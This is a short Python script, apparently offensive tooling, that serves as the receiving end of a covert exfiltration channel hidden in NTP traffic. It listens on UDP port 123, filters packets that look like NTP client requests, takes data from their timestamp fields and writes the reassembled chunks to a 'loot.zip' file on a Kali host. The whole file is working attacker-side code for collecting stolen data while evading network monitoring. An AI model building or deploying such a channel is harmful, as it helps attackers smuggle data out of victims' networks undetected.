# NTP Covert Channel - Receiver
# Validates NTP packet structure and extracts data from timestamp fields
# Reassembles chunks into loot.zip upon receiving EOF signal
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 123))
s.settimeout(30)
data = bytearray()

while True:
    try:
        packet, addr = s.recvfrom(48)
        if len(packet) != 48:
            continue
        if packet[0] != 0x1B:
            continue
        chunk = packet[16:48]
        if chunk[:3] == b'EOF':
            break
        data.extend(chunk)
    except socket.timeout:
        break

open('/home/kali/loot/loot.zip', 'wb').write(data)
